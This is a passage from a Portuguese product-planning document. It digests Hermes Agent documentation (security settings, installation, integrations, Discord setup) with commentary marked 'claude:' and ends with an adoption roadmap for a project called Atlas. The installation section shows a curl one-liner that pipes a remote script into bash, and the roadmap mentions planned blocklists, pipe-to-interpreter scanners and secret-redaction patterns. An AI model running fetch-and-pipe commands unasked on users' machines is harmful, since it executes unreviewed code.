- `/sethome` define canal default para cron output
- `/title <name>` para retomar
- DM pairing > `GATEWAY_ALLOW_ALL_USERS=true`
- `/verbose new` ou `all` controla noise

**Security:**
- Untrusted code → `TERMINAL_BACKEND=docker`
- Windows: UTF-8 encoding explícito para evitar Unicode errors
- Approval choices: `[o]nce/[s]ession/[a]lways/[d]eny` — preferir `session` até confiança total
- **Nunca `[a]lways` precipitadamente**
- Container backends pulam approval (container = boundary)

**Workflow tips:**
- Deixe agent explorar com web/terminal/execute
- Verifique `/skills` antes de descrever procedimento longo (skill pode existir)
- Interrompa progressão inadequada
- Pós-sessão produtiva: "save to memory que..."

> **claude:** **"verifique `/skills` antes de descrever procedimento"** é UX cultura interessante. Atlas em B5.bis pode adicionar feedback no `AiPromptBuilder` quando há skill matching: "*Skill `dev-quality-gate` parece relevante. Quer carregar?*". Custo: meio dia.

> **claude:** **approval choices `[once|session|always|deny]`** — Atlas em B4 (PermissionSession) já planeja `--remember=2h`. Adicionar opção interactive prompt com 4 escolhas é UX melhor que duas. Trabalho 0.5d em B4.

> **claude:** **"Cache prefix economiza quando system prompt estável"** — confirma a recomendação de **frozen system prompt during session** que vinha mencionando. Adoção formal em B5: separar mutable session state (user message) de frozen system context (skills/memory/SOUL).

---

### 24.28 — Learning Path (`/docs/getting-started/learning-path`)

3 tiers de progressão:

| Tier | Ordem | Tempo |
|---|---|---|
| Beginner | install → quickstart → CLI → config | ~1h |
| Intermediate | sessions → messaging → tools → skills → memory → cron | ~2-3h |
| Advanced | architecture → adding tools → creating skills → RL training → contributing | ~4-6h |

6 trajetos temáticos:
- CLI Assistant (execute_code + context files)
- Messaging Bots (Telegram/Discord + voice)
- Task Automation (cron + batch)
- Custom Tools (skills + MCP)
- Model Training (RL pipeline)
- Python Library (programmatic embed)

> **claude:** Atlas pode adotar pattern similar de "trajetos" na futura documentação:
>   - "Operador único profundo" (CLI + sessions + memory + cron)
>   - "Operador móvel" (gateway Telegram + cron delivery)
>   - "Dev agent" (atlas dev autonomous + skill bundles)
>   - "Multi-machine" (remote backend + sync)
> 
> Não é prioridade V2.0; pattern para README futuro.

---

### 24.29 — Installation (`/docs/getting-started/installation`)

**One-liner** (Linux/macOS/WSL2/Termux):

```bash
curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash
```

**Instalador detecta e instala:**
- `uv` (Python package manager rápido)
- Python 3.11+
- Node.js v22
- `ripgrep`
- `ffmpeg`

**Estrutura pós-install:**

| Tipo | Code | Binary | Data |
|---|---|---|---|
| User | `~/.hermes/hermes-agent/` | `~/.local/bin/hermes` | `~/.hermes/` |
| Root | `/usr/local/lib/hermes-agent/` | `/usr/local/bin/hermes` | `/root/.hermes/` |

**Pós-install:** `hermes model` → `hermes tools` → `hermes gateway setup` → `hermes setup`.

**Plataforma-específico:**
- Windows = WSL2 obrigatório (native não suportado)
- Nix/NixOS = flake declarativo
- Termux = adaptação automática (`pkg` em vez de apt)

**Extras:** `.[all]`, `.[termux]`, `.[dev]`.

> **claude:** **instalador detecta + instala dependências (uv/python/node/rg/ffmpeg)** é UX premium para onboarding. Atlas com Laravel pode ter `atlas bootstrap --install-deps` que verifica e instala php/composer/postgres/etc. Trabalho ~1d em B0 ou em script paralelo.

> **claude:** **estrutura user vs root distinta** — Atlas adopta convenção. User-level default (`~/.atlas/`), root só se explicitly opted in.

---

### 24.30 — Features Overview (`/docs/user-guide/features/overview`)

Resumo das features (cobertas em detalhe nas seções anteriores). Pontos **novos** desta página:

**Context references** — "permitem injetar arquivos, pastas e URLs nas mensagens". Notação inline (provavelmente `@file:path` ou `@url:...`). Não há detalhe na overview.

**API Server compatível com OpenAI** — "expõe Hermes como endpoint compatível com OpenAI" para frontends como Open WebUI, LobeChat, LibreChat.

**9 image generation models via FAL.ai.**

**Browser backends:** Browserbase (cloud anti-bot), Browser Use, Chrome local via CDP, Chromium headless.

**RL training** — gerar trajectory data para fine-tuning.

**Batch processing** — agent em centenas de prompts em paralelo, gera dados ShareGPT.

> **claude:** **API Server compatível com OpenAI é feature poderosa que Atlas pode adotar.** Hoje Atlas é só CLI; expor `POST /v1/chat/completions` faz Atlas virar backend para Open WebUI/LobeChat/LibreChat. Útil quando Vitor quiser uma UI web sem desenvolver. Atlas tem Laravel — adicionar endpoint OpenAI-compatible é ~2-3 dias. **Encaixa em B10/B11 ou bloco novo "Atlas API Server".**

> **claude:** **Context references (inject files/folders/URLs em mensagens)** — sintaxe específica não documentada na overview. Provavelmente `@file:path` ou `@url:...`. Atlas em B5.bis pode adotar — `@workspace/path/to/file.php` no prompt → parser injeta como tool result no início. Trabalho ~1d.

> **claude:** **Browserbase / Browser Use** — overkill para Atlas. Skip.

> **claude:** **RL training + Batch processing** são features de **research lab** (Nous é research org). Atlas é produto pessoal — fora de escopo.

---

### 24.31 — Integrations (`/docs/integrations`)

**Web search:** 4 backends — Firecrawl (default), Parallel, Tavily, Exa.

**Browser:** 4 backends — Browserbase (cloud anti-bot), Browser Use, Chrome via CDP, Chromium headless.

**Voice:** Edge TTS, ElevenLabs, OpenAI TTS, MiniMax, NeuTTS + STT (faster-whisper local, Groq, OpenAI, Mistral, xAI).

**Messaging (15+):** Telegram, Discord, Slack, WhatsApp, Signal, Matrix, Mattermost, Email, SMS, DingTalk, Feishu, WeCom, Weixin, BlueBubbles, QQ Bot, Home Assistant, Webhooks.

**Home Assistant:** 4 tools dedicadas (list_entities, get_state, list_services, call_service).

**Memory:** 8 providers externos (Honcho, OpenViking, Mem0, Hindsight, Holographic, RetainDB, ByteRover, Supermemory).

**API access:** servidor API OpenAI-compatible para Open WebUI / LobeChat / LibreChat.

**MCP:** GitHub, databases, filesystem, internal APIs, browser stacks. Stdio + SSE transports. Filtragem por server.

**Plugin system:** descoberta em `~/.hermes/plugins/`, `.hermes/plugins/`, pip entry points.

**IDE (ACP):** VS Code, Zed, JetBrains — render messages, tool activity, file diffs, terminal commands.

**RL Training + Batch processing** — research lab features.

> **claude:** **15+ messaging platforms é decisão de "agente generalista universal".** Atlas começa **com Telegram** (B10), depois pode expandir para Discord (B10.5) e Slack (B10.6) se Vitor usar. Mais que isso é noise. **Não copiar lista inteira.**

> **claude:** **8 memory providers plugáveis** — Atlas com `MemoryDelta` próprio é mais honesto. Suportar plug Honcho ou Mem0 só se Vitor pedir explicitamente.

> **claude:** **API server OpenAI-compatible** — repito da §24.30. **Vale adicionar como B11.5 ou separadamente**, opens caminho para Atlas backend agnóstico de UI.

---

### 24.32 — Discord adapter (`/docs/user-guide/messaging/discord`)

**Setup gotchas críticos:**
- Discord Developer Portal → criar app → **ativar Message Content Intent** (sem isso bot não lê mensagens)
- `DISCORD_BOT_TOKEN`, `DISCORD_ALLOWED_USERS`, `DISCORD_ALLOWED_ROLES`
- Default deny — sem allowlist, todos negados

**Comportamento por canal:**

| Canal | @mention required? |
|---|---|
| DM | não |
| Server channel | sim (default `DISCORD_REQUIRE_MENTION=true`) |
| Free response channel (config) | não |
| Thread | herda regras do canal pai |

**`DISCORD_FREE_RESPONSE_CHANNELS`** lista canais onde bot responde sem mention.

**Skills → slash commands automaticamente.** `/model` dropdown, `/sethome` define canal proativo.

**Voice:**
- Memos transcritos via Whisper (local/Groq/OpenAI)
- `/voice tts` ativa TTS reply
- Voice channels bidirecional

**Threads:**
- `DISCORD_AUTO_THREAD=true` (default) — cada menção cria thread isolada
- `group_sessions_per_user: true` (default) = per-user dentro do mesmo canal
- `false` = sessão compartilhada room-wide

**Mention guard:**
- `DISCORD_ALLOW_MENTION_EVERYONE=false` (default)
- `DISCORD_ALLOW_MENTION_ROLES=false`

**Forum channels** — auto-detect, bot cria thread por envio, nome derivado da primeira linha.

**Troubleshooting:**
- bot online mas não responde → Message Content Intent não ativado
- 403 errors → permissões View Channels / Send Messages / Attach Files

> **claude:** **Discord adapter é mais complexo que Telegram.** Atlas em B10 começa **só Telegram** (mais simples, single-token, sem intent privilege). Discord só em B10v2 quando V2.0 estiver fechado.

> **claude:** **`DISCORD_AUTO_THREAD=true` por menção** + **`group_sessions_per_user: true`** — Atlas adota mesmas defaults se algum dia adicionar Discord. Cada user tem session própria mesmo em canal compartilhado.

> **claude:** **Mention guard (`@everyone` block)** é higiene básica. Atlas em B10v2 adopt literal.

---

## 25. SÍNTESE FINAL — Mapa de adoção do loop

> Esta seção fecha o loop. Consolida TODAS as recomendações de adoção/rejeição em tabela única navegável, ranqueada por prioridade.

### 25.1 Mapa completo de adoção (todas as iterações)

**Adoção urgente (higiene + segurança imediata):**

| Item | Origem | Encaixe | Esforço |
|---|---|---|---|
| MCP env filter (passa só `PATH/HOME/USER/LANG/...`) | §24.6 | antes de qualquer subprocess novo | 1h |
| `shlex.quote()` em shell + `realpath()` em access checks | §24.18 | auditoria geral | 2h |
| Redaction patterns (regex `ghp_...`, `sk-...`, etc.) em logs/output | §24.6 | melhoria geral | 0.5d |

**B0 (cleanup + glossário) — confirmar/expandir:**

| Item | Origem | Esforço |
|---|---|---|
| `atlas config set key val` auto-routing .env vs config | §24.4 | 0.5d |
| Conventional Commits + branch naming | §24.18 | 1h |
| `atlas dump` (resumo copy-paste para suporte) | §24.25 | 0.5d |
| `atlas -z <prompt>` one-shot puro (sem banner) | §24.25 | 0.5d |
| `ATLAS_INFERENCE_MODEL` / `ATLAS_INFERENCE_PROVIDER` env override | §24.25 | 1h |

**B1 (comandos faltantes + quick wins) — adicionar:**

| Item | Origem | Esforço |
|---|---|---|
| `/steer` mid-run nudge | §15 + §24.1 | 0.5d |
| Quick commands (`type: exec` / `type: alias` em `~/.atlas/config.yaml`) | §24.1 | 0.5d |
| Busy input modes (`/busy interrupt|queue|steer`) | §24.1 | 1d |

**B2 (DevExecutionPlan + repair loop) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| `atlas dev -w` (worktree isolado) | §24.1 + §24.9 | 1d |
| Plan-validate-execute como skill `dev-quality-gate` bundled | §22.5 | 1d |

**B3 (tool events + atlas trace) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| Tool execution feed `┊ tool_name (Xms)` no terminal | §24.1 | 0.5d |
| ID format display `YYYYMMDD_HHMMSS_<hex>` | §24.5 | 0.5d |
| `atlas logs --component agent|gateway|tools|cli|cron --level WARNING --since 1h` granularidade | §24.25 | 0.5d |
| `atlas trace replay` (script reproduzível) | §22.10 | 0.5d |

**B4 (PermissionSession + approval) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| **YOLO mode + hardline blocklist** | §24.6 | 1d |
| 4-choice approval (`once/session/always/deny`) | §24.6 | 0.5d |
| `code_execution.mode: project|strict` distinção | §24.4 | 0.5d |
| Pré-exec scanner minimal nativo (homograph + pipe-to-interp + control chars) | §24.6 | 0.5d |

**B5 (MemoryDelta — apenas memória pós-sessão):**

| Item | Origem | Esforço |
|---|---|---|
| Limite de char/token na injeção (preserva cache) | §24.2 | 0.5d |
| `§` delimiter em vez de JSON arrays | §24.2 | 0.5d |
| Substring matching com erro de ambiguidade no `replace` | §24.2 | 0.5d |
| Separação frozen system memory vs mutable user-message state | §24.2 + §24.16 | 1d |
| Lineage `parent_thread_id` em compactions | §24.5 | 2d |
| Scan pré-aceitação para injection patterns | §24.6 | 0.5d |
| Busca semântica com pgvector (vantagem Atlas) | §24.2 | 2d |

**B5.bis (skills bundle agentskills.io compat) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| Bundle format (`SKILL.md` + `scripts/` + `references/` + `assets/`) | §22.1 | 1d |
| 6 frontmatter fields canônicos + `compatibility` cruzado com Doctor | §22.1 | 1d |
| Progressive disclosure (3 tiers) | §22.2 | 2d |
| Discovery `.agents/skills/` cross-client | §22.3 | 0.5d |
| Trust gate em project skills | §22.3 | 0.5d |
| Hermes-specific extension: `requires_toolsets` / `fallback_for_toolsets` | §24.11 | 0.5d |
| Trust levels (`builtin|official|community`) + `--force` rule | §24.11 | 0.5d |
| `required_environment_variables` com prompts + help_url | §24.11 | 1d |
| 6 tipos de context files com hierarquia first-match-wins (`.atlas.md/AGENTS.md/CLAUDE.md/.cursorrules`) | §24.24 | 2d |
| 20K char limit + truncagem 70/20/10 | §24.24 | 0.5d |
| AGENTS.md aninhado descoberto progressivamente | §24.24 | 1d |
| Header `# Project Context` ao montar | §24.24 | 5min |
| Security scan com regex + Unicode invisível detection | §24.24 + §24.6 | 1d |
| `~/.atlas/SOUL.md` como identidade primária + auto-create | §24.23 | 0.5d |
| `atlas:runtime session_search` (Postgres tsvector + sumarização) | §24.5 | 1d |

**B6 (RouterDecision + atlas compare) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| Fallback com warn em log (em vez de erro) + max 1×/session | §24.7 + §24.15 | 0.5d |
| Auxiliary models por tarefa (8 slots: title_gen, vision, compression, session_search, approval, web_extract, skills_hub, mcp) | §24.7 | 1d |
| Detecção de context_length (3 níveis: override → /v1/models → fallback família) | §24.15 | 0.5d |
| Distinção `context_length` vs `max_tokens` em `ai_traces.metadata` | §24.15 | 0.5d |

**B7 (TUI Fase 4) — expandir/revisitar:**

| Item | Origem | Esforço |
|---|---|---|
| **Stack: revisitar Bubble Tea (Go) vs Ink (React/Node)** | §24.3 | (decisão) |
| Status bar com cores por % contexto + git branch + stopwatch | §24.1 + §24.3 | 0.5d |
| OSC 11 theme detection + OSC 52 clipboard | §24.3 | 0.5d |
| `/agents` overlay (kill/pause/cost rollup) | §24.3 + §24.12 | 2d |
| Compaction protect-last-N (preserva primeiras 3 + últimas 20) | §24.1 | 0.5d |

**B8 (upgrade/rollback) — expandir:**

| Item | Origem | Esforço |
|---|---|---|
| `atlas profile export -o file.tar.gz` + import | §24.25 | 1d |

**B9 — NOVO BLOCO — Cron / Scheduled Tasks** (3-4 dias base + extensões):

| Item | Origem | Esforço |
|---|---|---|
| `atlas:cli:schedule` com 4 formatos de schedule | §24.10 | 2d |
| Job schema 17 campos | §24.10 | 0.5d |
| Tick via Laravel Scheduler (60s) | §24.10 | 0.5d |
| `[SILENT]` marker para "só reportar anomalia" | §24.10 | 5min |
| "Failed jobs always deliver" override | §24.10 | 5min |
| Anti-recursion (cron job não cria outro cron job) | §24.10 | 0.5d |
| `workdir` jobs sequenciais via `WithoutOverlapping` | §24.10 | 0.5d |
| `context_from` (chaining outputs entre jobs) | §24.10 | 0.5d |

**B10 — NOVO BLOCO — Messaging Gateway Telegram** (5-7 dias base + extensões):

| Item | Origem | Esforço |
|---|---|---|
| Long-running queue worker `atlas:gateway:run` | §24.13 | 1d |
| **DM Pairing protocol completo** (8 chars, alfabeto não-ambíguo, TTL 1h, rate limit, lockout, `chmod 0600`) | §24.6 | 2d |
| 6 níveis de autorização com **default deny** | §24.6 | 1d |
| `MEDIA:/path/file` tag pattern para upload | §24.19 | 1d |
| Streaming via `editMessageText` Bot API | §24.19 | 0.5d |
| `/sethome` define canal proativo (recebe cron output) | §24.13 | 0.5d |
| 3 níveis de allowlist (DM/group-users/group-chats) | §24.19 | 0.5d |
| Auto-resets diários opt-in (`gateway.auto_reset_at: "04:00"`) | §24.13 | 0.5d |
| Webhook adapter como caminho rápido alternativo | §24.13 | 1d |

**B11 — NOVO BLOCO — Remote Backend SSH** (3-5 dias base):

| Item | Origem | Esforço |
|---|---|---|
| `atlas remote add/connect/sync/disconnect` | §24.11 | 2d |
| `terminal.shell_init_files` para detectar nvm/pyenv | §24.26 | 0.5d |
| Docker isolation flags se eventually adopta Docker | §24.6 | 1d |

**B11.5 — NOVO BLOCO — Atlas API Server (OpenAI-compatible)** (2-3 dias):

| Item | Origem | Esforço |
|---|---|---|
| Endpoint `POST /v1/chat/completions` Laravel | §24.30 + §24.31 | 2d |
| Auth via Bearer token | — | 0.5d |
| Compat com Open WebUI / LobeChat / LibreChat | §24.31 | (testes) |

**B12 — NOVO BLOCO — Background tasks** (~3 dias):

| Item | Origem | Esforço |
|---|---|---|
| `atlas background "<prompt>"` (sessão isolada paralela) | §24.1 | 2d |
| Cap default em 1 nível (flat) — opt-in para multi-level | §24.12 | 0.5d |
| Tools bloqueadas em subagent (memory/code_execution/send_message) | §24.12 | 0.5d |
| Cada subagent em worktree separado se múltiplos paralelos | §24.12 | 0.5d |
| **Durável-por-default via Laravel queue** (vantagem Atlas vs Hermes síncrono) | §24.12 | 1d |
| `process(action="list|poll|wait|log|kill")` API | §24.21 | 1d |

**B13+ (longo prazo, opt-in):**

| Item | Origem |
|---|---|
| MCP cliente nativo (suporte stdio + HTTP) | §24.14 |
| `atlas mcp serve` (Atlas como servidor MCP, expor 10 tools) | §24.14 |
| `atlas acp serve` (IDE integration ACP) | §24.13 |
| Transport ABC (Anthropic API direta, OpenAI-compatible) | §4 |
| Self-evolution pipeline (DSPy + GEPA contra traces Atlas) | §16 |
| Plugin system (5 surfaces) | §7 + §24 |

**Anti-padrões a NÃO copiar (consolidados):**

- monolitos de 605 KB num arquivo
- `AIAgent` com ~60 parâmetros init
- `approval.py` 52 KB dentro de `tools/` (Atlas mantém `AiPermissionEngine` separado)
- "memória self-improving" como vibe (B5 com ratificação humana é honesto)
- skills bundled com 25 categorias na release (Atlas começa 7-8)
- 17 messaging platforms first-day (Atlas começa 1)
- `personality` overlays 14 modos (Atlas é cirúrgico)
- voice mode prematuro
- `/skin` engine com banner colors customizáveis
- TTS com 8 providers + STT com 4 + image gen com 9 (escopo de agente generalista)
- `--yolo` global sem hardline blocklist (sempre adotar com proteção)
- `Tirith fail-open: true` (Atlas adota fail-closed)
- markdown stripping em respostas (Atlas mantém estrutura para rendering)
- encoding fallback `latin-1` (Atlas UTF-8 estrito + erro descritivo)
- 1024 char description limit (Atlas cap em 500 internamente)
- "always" approval em uma escolha primária (priorizar `session`)

### 25.2 Roadmap Atlas atualizado pós-loop

**V1 (atual):** já implementado parcialmente.

**V2.0 (vV3.0 do plano original):** B0 → B1 → B2 → B3 → B4 → B5 → B5.bis → B6 → B7 → B8.
Estimativa atualizada com tudo do loop: **~38-50 dias úteis** (vs original 18-25 — o loop adicionou ~20 dias de melhorias verificadas em produção pelo Hermes).

**V2.5:** B9 (cron) + B10 (Telegram gateway) + B11 (remote SSH). **+10-15 dias**.

**V3:** B11.5 (API server) + B12 (background tasks). **+5-7 dias**.

**V4+:** B13+ (MCP, ACP, Transport ABC, self-evolution, plugins). **opt-in, scope variável.**

### 25.3 Decisões pendentes pós-loop (5 grandes)

1. **B7 stack: Bubble Tea (Go) ou Ink (React/Node)?** Hermes escolheu Ink. Atlas-app é Expo. Decisão final.
2. **B5.bis substitui B5 ou coexiste?** Recomendação minha: B5 fica só com `MemoryDelta` (memória pós-sessão); B5.bis é skills bundle. Confirmar.
3. **B9 antes de B7?** Cron é alta-utilidade prática; TUI é higiene. Vitor decide.
4. **B10 começa Telegram-only?** Recomendação minha: sim. Discord/Slack só V2.5 se Vitor usar.
5. **B11.5 (API server) faz sentido?** Permite Atlas backend para Open WebUI/LobeChat. Vitor decide.

### 25.4 Bottom-line do loop

O Hermes Agent é **vasto, bem-engenheirado em UX, monolítico em código, marketing-honesto na maior parte (algumas exceções como "self-improving"), e mais rico em features que Atlas pode absorver em 2-3 anos**. As lições mais valiosas são:

1. **Higiene de segurança** (MCP env filter, redaction patterns, hardline blocklist, DM pairing protocol).
2. **UX premium em pequenos detalhes** (status bar com cores, busy input modes, `/steer`, `[SILENT]` marker, ID format human-readable).
3. **Patterns arquiteturais** (Transport ABC, auxiliary models por tarefa, progressive disclosure de skills, frozen system prompt for cache).
4. **Decisões de produto** (worktree-by-default, cron como first-class, Telegram-first messaging, profile vs workspace).
5. **Honestidade sobre limitações** (memory loop é manual, não automático; subagents são síncronos não-duráveis; HTTP MCP imaturo).

**Atlas tem 3 vantagens estruturais sobre Hermes** que merecem ser exploradas:

- **Postgres + pgvector** (busca semântica sem LLM summarization)
- **Laravel queue durável** (subagents persistem além da interrupção do parent)
- **Estrutura modular** (services ≤30 KB vs monolitos de 605 KB)

E **3 fraquezas comparativas** que Atlas precisa fechar:

- **Cron ausente** (B9 obrigatório)
- **Messaging gateway ausente** (B10 obrigatório)
- **MCP nativo ausente** (B13+ desejável)

Loop fechado. **Documento de ~3.300 linhas é o destilado mais completo da documentação Hermes em português, com opinião direta para o Atlas.**

---
